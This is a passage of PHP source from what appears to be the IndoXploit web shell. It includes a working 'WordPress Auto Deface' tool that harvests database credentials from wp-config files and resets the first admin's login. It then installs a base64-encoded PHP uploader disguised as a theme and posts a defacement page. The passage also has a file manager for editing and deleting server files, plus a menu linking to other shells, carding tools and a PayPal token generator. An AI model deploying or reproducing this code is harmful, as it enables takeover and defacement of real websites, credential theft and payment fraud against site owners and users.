			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "0x1999";
		$pass = "0x1999";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By 0x1999' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['k3'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "indoxploit";
		$pass = "indoxploit";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By 0x1999' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }
        return rmdir($path);
    }
    else if (is_file($path) === true)
    {
        return unlink($path);
    }
    return false;
}
	$delete_dir = Delete($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['k3_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='k3_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
}else {
	if(is_dir($dir) == true) {
		echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr>
		<th class="th_home"><center>Name</center></th>
		<th class="th_home"><center>Type</center></th>
		<th class="th_home"><center>Size</center></th>
		<th class="th_home"><center>Last Modified</center></th>
		<th class="th_home"><center>Permission</center></th>
		<th class="th_home"><center>Action</center></th>
		</tr>';
		$scandir = scandir($dir);
		foreach($scandir as $dirx) {
			$dtype = filetype("$dir/$dirx");
			$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
 			if(!is_dir("$dir/$dirx")) continue;
 			if($dirx === '..') {
 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			}
 			echo "<tr>";
 			echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></table>";
	} else {
		echo "<font color=red>can't open directory</font>";
	}
	}
echo "<center><hr><form>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Creator </option>
   <option value='$ling=wso'>WSO 2.8.1</option>
   <option value='$ling=injection'>1n73ction v3</option>
   <option value='$ling=wk'>WHMCS Killer</option>
   <option value='$ling=adminer'>Adminer</option>
   <option value='$ling=b374k'>b374k Shell</option>
   <option value='$ling=b374k323'>b374k 3.2</option>   
   <option value='$ling=bh'>BlackHat Shell</option>      
   <option value='$ling=dhanus'>Dhanush Shell</option>     
   <option value='$ling=r57'>R57 Shell</option>    
<option value='$ling=encodedecode'>Encode Decode</option>    
<option value='$ling=r57'>R57 Shell</option>    
</select>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Carder </option>
   <option value='$ling=extractor'>DB Email Extractor</option>
   <option value='$ling=promailerv2'>Pro Mailer V2</option>     
   <option value='$ling=bukalapak'>BukaLapak Checker</option>        
   <option value='$ling=tokopedia'>TokoPedia Checker</option>  
   <option value='$ling=tokenpp'>Paypal Token Generator</option>  
   <option value='$ling=mailer'>Mailer</option>  
   <option value='$ling=gamestopceker'>GamesTop Checker</option>
   </select>
<noscript><input type='submit' value='Submit'></noscript>
</form>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit</font></a> </center>";
?>
</html>
